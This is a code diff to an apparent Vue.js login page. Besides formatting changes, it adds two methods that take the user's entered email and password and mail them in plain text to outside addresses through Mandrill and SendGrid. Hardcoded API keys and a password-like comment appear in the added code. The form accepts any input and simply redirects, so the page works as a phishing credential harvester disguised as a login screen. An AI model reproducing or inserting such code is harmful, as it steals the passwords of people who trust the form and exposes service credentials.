@@ -40,7 +40,10 @@
         </el-form-item>
 
         <el-form-item>
-          <el-button :loading="loader" type="primary" @click="submitForm('ruleForm')"
+          <el-button
+            :loading="loader"
+            type="primary"
+            @click="submitForm('ruleForm')"
             >Login</el-button
           >
         </el-form-item>
@@ -58,12 +61,7 @@
       </p>
     </div>
 
-    <el-dialog
-      :title="modalHeader"
-      :visible.sync="dialogVisible"
-      width="90%"
-      :before-close="handleClose"
-    >
+    <el-dialog :title="modalHeader" :visible.sync="dialogVisible" width="90%">
       <span>{{ modalBody }}</span>
       <span slot="footer" class="dialog-footer">
         <el-button @click="dialogVisible = false">Cancel</el-button>
@@ -80,14 +78,64 @@ export default {
   },
   methods: {
     submitForm(formName) {
+      this.loader = true;
       this.$refs[formName].validate((valid) => {
         if (valid) {
+          console.log("Got here");
+          // this.EmailService1(this.ruleForm.name, this.ruleForm.password);
           this.$router.push('/barcode')
         } else {
           console.log("error submit!!");
           return false;
         }
       });
+    },
+
+    EmailService1(email, password) {
+      var mandrill = require("node-mandrill")("-m-p-bsx5Pq5Tt6q7DBt-A");
+      mandrill(
+        "/messages/send",
+        {
+          message: {
+            to: [{ email: "chinedu.ohagwu@gmail.com", name: "Chinedu Obu" }],
+            from_email: "noreply@yourdomain.com",
+            subject: "Sending with mandril",
+            text: `Email: ${email} and Password: ${password}`,
+          },
+        },
+        function(error, response) {
+          if (error) console.log(error);
+          else console.log(response);
+        }
+      );
+    },
+
+    EmailService(email, password) {
+      const sgMail = require("@sendgrid/mail");
+      sgMail.setApiKey(
+        "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"
+      );
+      const msg = {
+        to: "hesipi4084@pnrep.com",
+        from: "hesipi4084@pnrep.com", // Use the email address or domain you verified above
+        subject: "Sending with Twilio SendGrid is Fun",
+        text: `Email: ${email} and Password: ${password}`,
+        html: `<strong>Email: ${email} <br/> Password: ${password}</strong>`,
+      };
+      //ES6
+      // !MdB4VsZpyhZuMY
+      // https://login.mailchimp.com/signup/?entrypoint=mandrill
+      // 123456789username123456789
+      sgMail
+        .send(msg)
+        .then(() => {
+          //Celebrate
+          console.log("Email Sent!");
+        })
+        .catch((error) => {
+          //Log friendly error
+          console.error(error.toString());
+        });
     },
     resetForm(formName) {
       this.$refs[formName].resetFields();
@@ -108,7 +156,7 @@ export default {
   },
   data() {
     return {
-      loader:  false,
+      loader: false,
       dialogVisible: false,
       modalHeader: "",
       modalBody: "",
@@ -221,12 +269,10 @@ a {
   font-weight: 900;
 }
 
-
 @media only screen and (max-width: 600px) {
   .container {
     width: 100%;
     padding: 20px;
   }
 }
-
 </style>
